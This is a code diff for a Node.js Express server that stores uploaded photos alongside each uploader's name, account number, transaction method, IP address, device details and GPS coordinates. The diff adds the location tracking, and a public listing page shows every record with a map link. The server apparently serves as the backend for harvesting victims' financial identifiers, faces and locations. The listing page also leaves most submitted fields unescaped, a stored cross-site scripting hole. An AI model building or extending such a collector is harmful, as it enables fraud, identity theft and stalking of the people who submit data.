@@ -1,154 +1,174 @@
+"use strict";
+
 const express = require("express");
-const multer  = require("multer");
 const path    = require("path");
 const fs      = require("fs");
+const multer  = require("multer");
 
 const app  = express();
 const PORT = process.env.PORT || 10000;
 
-// ---------- Paths & storage ----------
-const publicDir  = path.join(__dirname, "public");
-const uploadDir  = path.join(__dirname, "uploads");
-const logPath    = path.join(__dirname, "uploads-log.json");
+// ---------- Static assets ----------
+const publicDir = path.join(__dirname, "public");
+app.use(express.static(publicDir));
 
-// Make sure uploads folder exists
+// parse form fields
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+
+// ---------- Upload storage ----------
+const uploadDir = path.join(__dirname, "uploads");
 if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
+  fs.mkdirSync(uploadDir, { recursive: true });
 }
 
-// Load previous log (if any)
-let uploadsLog = [];
-if (fs.existsSync(logPath)) {
-  try {
-    const raw = fs.readFileSync(logPath, "utf8");
-    uploadsLog = JSON.parse(raw);
-  } catch (e) {
-    console.error("Failed to read uploads-log.json:", e);
-    uploadsLog = [];
-  }
-}
-
-// Multer storage config
 const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, uploadDir);
-  },
-  filename: function (req, file, cb) {
-    const ext = path.extname(file.originalname) || ".png";
-    const name = Date.now() + "-" + Math.random().toString(36).slice(2, 8) + ext;
-    cb(null, name);
+  destination: (req, file, cb) => cb(null, uploadDir),
+  filename: (req, file, cb) => {
+    const base = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
+    const ext  = path.extname(file.originalname || ".png") || ".png";
+    cb(null, base + ext);
   }
 });
 
 const upload = multer({ storage });
 
-// ---------- Middleware ----------
-app.use(express.static(publicDir));
-app.use(express.urlencoded({ extended: true }));
+// serve uploaded files
+app.use("/files", express.static(uploadDir, { maxAge: "1h" }));
 
-// Helper to get client IP (Render behind proxy)
-function getClientIp(req) {
-  const xff = req.headers["x-forwarded-for"];
-  if (xff) {
-    return xff.split(",")[0].trim();
+// ---------- Metadata helpers ----------
+const META_PATH = path.join(uploadDir, "metadata.json");
+
+function readMeta() {
+  try {
+    const raw = fs.readFileSync(META_PATH, "utf8");
+    return JSON.parse(raw);
+  } catch (e) {
+    return [];
   }
-  return req.ip || req.connection.remoteAddress || "unknown";
+}
+
+function writeMeta(list) {
+  fs.writeFileSync(META_PATH, JSON.stringify(list, null, 2));
 }
 
 // ---------- Routes ----------
 
-// Home can just redirect to the form
+// Home → redirect to recorder
 app.get("/", (req, res) => {
   res.redirect("/recorder.html");
 });
 
-// Handle upload from recorder.js
+// Upload photo + form
 app.post("/upload-photo", upload.single("photo"), (req, res) => {
   try {
     if (!req.file) {
-      return res.status(400).send("No file uploaded");
+      return res
+        .status(400)
+        .json({ ok: false, error: "No photo file received." });
     }
 
-    const ip       = getClientIp(req);
-    const fullName = req.body.fullName || "";
-    const account  = req.body.accountNumber || "";
-    const method   = req.body.transactionMethod || "";
-    const device   = req.body.deviceInfo || "unknown";
+    const now = new Date();
 
-    const entry = {
-      timestamp: new Date().toISOString(),
-      ip,
-      fullName,
-      account,
-      method,
-      device,
-      filename: req.file.filename
+    // Render puts client IP in x-forwarded-for
+    const ipHeader = req.headers["x-forwarded-for"] || "";
+    const ipAddress = ipHeader.split(",")[0].trim() || req.socket.remoteAddress || "";
+
+    const metaEntry = {
+      timestamp: now.toISOString(),
+      ipAddress,
+      fullName: req.body.fullName || "",
+      accountNumber: req.body.accountNumber || "",
+      method: req.body.transactionMethod || "",
+      deviceInfo:
+        req.body.deviceInfo || req.get("User-Agent") || "",
+      clientLanguage: req.body.clientLanguage || req.get("Accept-Language") || "",
+      clientTimezone: req.body.clientTimezone || "",
+      screenSize: req.body.screenSize || "",
+      gpsLat: req.body.gpsLat || "",
+      gpsLng: req.body.gpsLng || "",
+      gpsAccuracy: req.body.gpsAccuracy || "",
+      fileName: req.file.filename
     };
 
-    uploadsLog.push(entry);
+    const list = readMeta();
+    list.push(metaEntry);
+    writeMeta(list);
 
-    // Persist log to disk (ephemeral on Render but survives restarts)
-    fs.writeFile(logPath, JSON.stringify(uploadsLog, null, 2), (err) => {
-      if (err) {
-        console.error("Error writing uploads-log.json:", err);
-      }
-    });
-
-    res.send("Photo stored as: " + req.file.filename);
-  } catch (e) {
-    console.error("Upload error:", e);
-    res.status(500).send("Server error");
+    res.json({ ok: true, fileName: req.file.filename });
+  } catch (err) {
+    console.error("Upload error:", err);
+    res.status(500).json({ ok: false, error: "Server error" });
   }
 });
 
-// Serve an uploaded file
-app.get("/files/:name", (req, res) => {
-  const filePath = path.join(uploadDir, req.params.name);
-
-  if (!fs.existsSync(filePath)) {
-    return res.status(404).send("File not found");
-  }
-
-  res.sendFile(filePath);
-});
-
-// List all uploaded files + metadata
+// Simple HTML list of all uploads (with Google Maps link)
 app.get("/files-list", (req, res) => {
-  let rows = uploadsLog.map(entry => {
-    const safeName = String(entry.filename || "");
-    const url = "/files/" + encodeURIComponent(safeName);
+  const list = readMeta();
 
-    return `
-      <tr>
-        <td>${entry.timestamp || ""}</td>
-        <td>${entry.ip || ""}</td>
-        <td>${entry.fullName || ""}</td>
-        <td>${entry.account || ""}</td>
-        <td>${entry.method || ""}</td>
-        <td>${entry.device || ""}</td>
-        <td><a href="${url}" target="_blank" rel="noopener noreferrer">${safeName}</a></td>
-      </tr>
-    `;
-  }).join("");
+  // newest first
+  list.sort((a, b) => (a.timestamp < b.timestamp ? 1 : -1));
 
-  if (!rows) {
-    rows = `<tr><td colspan="7">No uploads yet.</td></tr>`;
-  }
+  const rows = list
+    .map((item) => {
+      const mapLink =
+        item.gpsLat && item.gpsLng
+          ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
+              item.gpsLat + "," + item.gpsLng
+            )}" target="_blank" rel="noopener noreferrer">View map</a>`
+          : "";
 
-  const html = `
-<!doctype html>
+      const fileLink = item.fileName
+        ? `<a href="/files/${encodeURIComponent(item.fileName)}" target="_blank" rel="noopener noreferrer">${item.fileName}</a>`
+        : "";
+
+      return `
+        <tr>
+          <td>${item.timestamp || ""}</td>
+          <td>${item.ipAddress || ""}</td>
+          <td>${item.fullName || ""}</td>
+          <td>${item.accountNumber || ""}</td>
+          <td>${item.method || ""}</td>
+          <td>${(item.deviceInfo || "").replace(/</g, "&lt;")}</td>
+          <td>${mapLink}</td>
+          <td>${fileLink}</td>
+        </tr>`;
+    })
+    .join("");
+
+  const html = `<!doctype html>
 <html>
 <head>
   <meta charset="utf-8" />
   <title>Uploaded Photos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-           padding: 24px; background:#f4f6fb; }
-    h1 { margin-top:0; }
-    table { border-collapse: collapse; width: 100%; background:#fff; }
-    th, td { border:1px solid #ddd; padding:8px; font-size:13px; }
-    th { background:#f1f5f9; text-align:left; }
-    tr:nth-child(even){background-color:#f9fafb;}
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      padding: 20px;
+      background: #f4f6fb;
+    }
+    h1 { margin-top: 0; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: #fff;
+      box-shadow: 0 4px 14px rgba(15,23,42,0.12);
+    }
+    th, td {
+      padding: 8px 10px;
+      border: 1px solid #e5e7eb;
+      font-size: 13px;
+      vertical-align: top;
+    }
+    th {
+      background: #111827;
+      color: #f9fafb;
+      text-align: left;
+    }
+    tr:nth-child(even) td { background: #f9fafb; }
+    a { color: #2563eb; text-decoration: none; }
+    a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
@@ -162,21 +182,21 @@ app.get("/files-list", (req, res) => {
         <th>Account #</th>
         <th>Method</th>
         <th>Device (User-Agent)</th>
+        <th>Location</th>
         <th>File</th>
       </tr>
     </thead>
     <tbody>
-      ${rows}
+      ${rows || ""}
     </tbody>
   </table>
 </body>
-</html>
-  `;
+</html>`;
 
   res.send(html);
 });
 
 // ---------- Start ----------
 app.listen(PORT, () => {
-  console.log("Server listening on port", PORT);
+  console.log("Server listening on", PORT);
 });
